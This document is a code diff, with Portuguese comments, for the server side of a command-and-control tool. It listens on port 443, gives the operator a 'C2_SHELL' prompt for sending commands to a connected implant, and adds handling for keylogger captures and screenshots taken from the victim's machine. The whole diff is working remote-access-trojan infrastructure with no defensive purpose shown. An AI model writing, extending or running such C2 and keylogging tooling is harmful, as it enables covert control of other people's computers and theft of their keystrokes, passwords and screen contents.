@@ -1,24 +1,36 @@
 import socket
 import sys
 import threading
+import protocolo
 
 LISTEN_IP = "0.0.0.0"
 PORT = 443
 
 def receive_handler(client_socket):
-    """Thread dedicada a escutar o cliente continuamente."""
     while True:
         try:
-            data = client_socket.recv(4096).decode(errors="ignore")
-            if not data:
-                print("\n[-] Client disconnected.")
-                break
-            print(data, end="", flush=True)
+            tipo, payload = protocolo.ler_mensagem(client_socket)
+            
+            if tipo == protocolo.MSG_TEXTO:
+                print(f"\n[Texto]: {payload.decode('utf-8', errors='replace')}\nC2_SHELL> ", end="", flush=True)
+                
+            elif tipo == protocolo.MSG_KEYLOG:
+                print(f"\n[Keylog]:\n{payload.decode('utf-8', errors='replace')}\nC2_SHELL> ", end="", flush=True)
+                
+            elif tipo == protocolo.MSG_IMAGEM:
+                nome_arquivo = f"screenshot_{int(threading.get_ident())}.png"
+                with open(nome_arquivo, "wb") as f:
+                    f.write(payload)
+                print(f"\n[+] Imagem salva como {nome_arquivo} ({len(payload)} bytes).\nC2_SHELL> ", end="", flush=True)
+                
         except socket.timeout:
             continue
-        except Exception:
+        except RuntimeError as e:
+            print(f"\n[-] Conexão abortada: {e}")
             break
-    print("\n[*] Receiver thread stopped.")
+        except Exception as e:
+            print(f"\n[!] Exceção inesperada: {type(e).__name__} - {e}")
+            break
 
 def start_server():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -36,21 +48,18 @@ def start_server():
         client_socket, client_address = server.accept()
         print(f"[+] Connection established from {client_address[0]}:{client_address[1]}")
         
-        # Timeout curto evita travamento eterno caso o socket falhe
-        client_socket.settimeout(2.0)
+        client_socket.settimeout(1.0)
         
-        # Inicia a thread de recebimento contínuo
         recv_thread = threading.Thread(target=receive_handler, args=(client_socket,), daemon=True)
         recv_thread.start()
         
         while True:
             try:
-                # O input agora fica livre para digitação a qualquer momento
                 command = input("C2_SHELL> ").strip()
                 if not command:
                     continue
                     
-                client_socket.send(command.encode())
+                protocolo.enviar_mensagem(client_socket, protocolo.MSG_TEXTO, command.encode())
                 
                 if command == "/exit":
                     print("[*] Closing connection.")
@@ -58,13 +67,13 @@ def start_server():
             except KeyboardInterrupt:
                 break
             except Exception as e:
-                print(f"[-] Error sending command: {e}")
+                print(f"[-] Error: {type(e).__name__} - {e}")
                 break
                     
     except KeyboardInterrupt:
         print("\n[*] Server stopping...")
     except Exception as e:
-        print(f"\n[!] Server error: {e}")
+        print(f"\n[!] Server error: {type(e).__name__} - {e}")
     finally:
         server.close()
 
